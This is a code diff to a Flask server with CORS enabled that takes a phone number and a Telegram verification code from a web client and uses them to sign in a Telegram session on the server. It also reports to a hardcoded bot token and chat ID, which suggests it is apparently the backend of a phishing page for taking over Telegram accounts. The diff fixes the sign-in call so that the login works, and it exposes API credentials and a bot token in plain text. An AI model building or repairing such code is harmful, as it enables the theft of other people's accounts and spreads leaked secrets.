@@ -10,11 +10,9 @@ from datetime import datetime
 app = Flask(__name__)
 CORS(app)
 
-# Your Telegram API credentials
 API_ID = 6627460
 API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"
 
-# YOUR BOT TOKEN - YOU'LL ADD THIS IN STEP 6
 BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
 YOUR_CHAT_ID = "8796685138"
 
@@ -134,10 +132,12 @@ def verify_code():
                 )
                 
                 await client.connect()
+                
+                # FIXED - using correct parameter name
                 await client.sign_in(
                     phone_number=phone,
-                    code=code,
-                    phone_code_hash=phone_code_hash
+                    phone_code_hash=phone_code_hash,
+                    phone_code=code
                 )
                 
                 return {'success': True, 'message': 'Login successful!'}
@@ -145,11 +145,11 @@ def verify_code():
             except Exception as e:
                 error_msg = str(e)
                 if 'PHONE_CODE_INVALID' in error_msg:
-                    return {'success': False, 'error': 'Invalid code'}
+                    return {'success': False, 'error': 'Invalid verification code'}
                 elif 'PHONE_CODE_EXPIRED' in error_msg:
                     return {'success': False, 'error': 'Code expired'}
                 else:
-                    return {'success': False, 'error': f'Error: {error_msg}'}
+                    return {'success': False, 'error': error_msg}
             finally:
                 if client:
                     await client.disconnect()
